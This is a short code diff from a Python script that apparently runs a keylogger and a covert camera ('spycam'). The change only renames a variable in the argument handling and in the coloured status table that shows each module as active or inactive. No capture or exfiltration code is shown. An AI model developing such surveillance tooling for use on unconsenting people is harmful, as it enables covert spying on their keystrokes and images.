@@ -81,7 +81,7 @@ if ('spycam' in sys.argv):
 			else :
 				mySpycam = takeAPicture(int(sys.argv[index+2]))
 				mySpycam.start()
-				spycamB = [True, sys.argv[index+2]]
+				spycamL = [True, sys.argv[index+2]]
 
 	except Exception as ex :
 		print(Errors.NODELAY)
@@ -98,12 +98,12 @@ else :
 	print(" ├─────────────┤ "+keyloggerL[1])
 	print(" │             │                         │")
 	print(" ├─────────────┼─────────────────────────┤")
-if (spycamB[0]==False):
+if (spycamL[0]==False):
 	print(" │  "+Colors.OKGREEN+"  Spycam "+Colors.ENDC+"  │         Inactive        │")
 	print(" ├─────────────┼─────────────────────────┤")
 else :
 	print(" │  "+Colors.OKGREEN+"  Spycam "+Colors.ENDC+"  │          Active         │")
-	print(" │             │        Delay = "+spycamB[1])
+	print(" │             │        Delay = "+spycamL[1])
 	print(" ├─────────────┼─────────────────────────┤")
 print(" │   "+Colors.OKGREEN+"Other"+Colors.ENDC+"     │         inactive        │")
 print(" ├─────────────┤                         │")
